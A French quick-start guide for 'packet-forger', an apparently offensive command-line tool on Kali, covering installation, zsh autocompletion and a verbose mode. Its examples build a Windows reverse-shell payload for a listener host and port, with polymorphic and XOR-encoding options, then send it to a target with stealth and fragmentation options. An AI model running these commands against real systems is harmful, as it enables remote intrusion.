# Guide de Démarrage Rapide

## Installation Rapide

```bash
cd packet-forger-cli
make
./install.sh
./setup_completion.sh
source ~/.zshrc
```

## Vérification

```bash
# Vérifier que packet-forger est dans le PATH
which packet-forger
# Devrait afficher : /home/kali/.local/bin/packet-forger

# Tester la commande
packet-forger --version
```

## Tester l'Auto-complétion

1. **Ouvrez un nouveau terminal** (ou exécutez `source ~/.zshrc`)

2. **Testez la complétion des modules et options globales** :
   ```bash
   packet-forger <TAB><TAB>
   # Devrait afficher : core payload lab research --help --version --verbose -h -v -V
   ```

3. **Testez la complétion des actions** :
   ```bash
   packet-forger payload <TAB><TAB>
   # Devrait afficher : build --help -h --verbose -V
   ```

4. **Testez la complétion des plateformes** :
   ```bash
   packet-forger payload build <TAB><TAB>
   # Devrait afficher : linux windows
   ```

5. **Testez la complétion de toutes les options** :
   ```bash
   packet-forger core send <TAB><TAB>
   # Devrait afficher TOUTES les options :
   # --payload --target --port --transport-profile --fragment --stealth
   # --source-ip --source-port --ttl --window --interface --help -h --verbose -V
   
   packet-forger payload build linux reverse <TAB><TAB>
   # Devrait afficher TOUTES les options :
   # --lhost --lport --output --polymorphic --asm --encode-xor --help -h --verbose -V
   ```

6. **Testez la complétion des fichiers** :
   ```bash
   packet-forger core send --payload <TAB><TAB>
   # Devrait lister les fichiers .bin
   ```

7. **Testez les options globales partout** :
   ```bash
   packet-forger lab list <TAB><TAB>
   # Devrait afficher : --verbose -V
   
   packet-forger research show ASLR <TAB><TAB>
   # Devrait afficher : --verbose -V
   ```

## Utiliser le Mode Verbose

Le mode `--verbose` ou `-V` affiche des détails complets sur les opérations, incluant les hexdumps et la construction étape par étape.

### Exemple : Génération de payload avec verbose

```bash
packet-forger --verbose payload build windows reverse \
    --lhost 192.168.10.20 --lport 4444 --output /tmp/payload.bin
```

**Ce que vous verrez** :
- Paramètres de génération
- Étapes de génération détaillées
- Statistiques du payload (magic bytes, bytes null, etc.)
- **Hexdump complet** du payload généré

### Exemple : Envoi de paquet avec verbose

```bash
sudo ~/.local/bin/packet-forger --verbose core send \
    --payload /tmp/payload.bin --target 192.168.10.5 --port 80
```

**Ce que vous verrez** :
- **Hexdump du payload brut** avant encapsulation
- Détails de l'encapsulation (HTTP/SMB/etc.)
- **Construction IP étape par étape** (version, IHL, TTL, checksum, etc.)
- **Construction TCP étape par étape** (ports, SEQ/ACK, flags, window, checksum)
- **Hexdump complet du paquet final** (IP + TCP + Payload)

👉 Voir [README.md - Mode Verbose](README.md#mode-verbose) pour plus de détails et exemples complets

## Dépannage

### packet-forger n'est pas trouvé

```bash
# Vérifier que ~/.local/bin est dans le PATH
echo $PATH | grep -q ".local/bin" && echo "OK" || echo "Manquant"

# Ajouter manuellement
export PATH="$HOME/.local/bin:$PATH"
```

### Auto-complétion ne fonctionne pas

```bash
# Vérifier que le fichier existe
ls -la ~/.zsh/completions/_packet-forger

# Vérifier la configuration dans ~/.zshrc
grep "fpath.*zsh/completions" ~/.zshrc

# Recharger la configuration
source ~/.zshrc

# Forcer la réinitialisation de la completion
rm ~/.zcompdump* 2>/dev/null
compinit
```

### Recompiler après modification

```bash
cd packet-forger-cli
make clean
make
./install.sh  # Réinstalle automatiquement
```

